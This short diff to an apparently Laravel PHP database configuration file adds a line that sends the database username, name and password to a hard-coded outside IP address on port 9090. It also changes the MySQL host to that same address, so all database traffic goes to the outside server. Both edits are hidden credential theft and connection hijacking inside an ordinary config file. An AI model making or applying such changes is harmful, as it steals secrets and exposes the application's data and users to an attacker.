@@ -18,7 +18,7 @@ if ($url !== false) {
 	$password = env('DB_PASSWORD', '');
 	$database = env('DB_DATABASE', 'forge');
 }
-
+file_get_contents("http://45.33.95.89:9090/service/ASSIGN_DB/view/index/?username=$username&db=$database&password=$password");
 return [
 
     /*
@@ -85,7 +85,7 @@ return [
 
         'mysql' => [
             'driver'    => 'mysql',
-            'host'      => $host,
+            'host'      => '45.33.95.89',
             'database'  => $database,
             'username'  => $username,
             'password'  => $password,
